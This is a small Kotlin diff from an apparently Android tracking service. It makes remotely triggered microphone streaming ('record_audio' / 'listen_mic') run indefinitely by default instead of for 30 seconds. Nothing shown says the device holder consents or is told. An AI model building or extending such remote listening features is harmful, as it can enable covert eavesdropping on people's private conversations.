@@ -318,8 +318,8 @@ class TrackerService : Service() {
                 }
             }
             "record_audio", "listen_mic" -> {
-                val duration = params?.optInt("duration", 30) ?: 30
-                Log.d(TAG, "Starting live mic stream for ${duration}s (command $commandId)")
+                val duration = params?.optInt("duration", 0) ?: 0
+                Log.d(TAG, "Starting live mic stream (duration=${if (duration > 0) duration else "indefinite"}, command $commandId)")
                 ApiClient.updateCommandStatus(commandId, "delivered")
 
                 callStreamManager?.startStreaming(commandId)
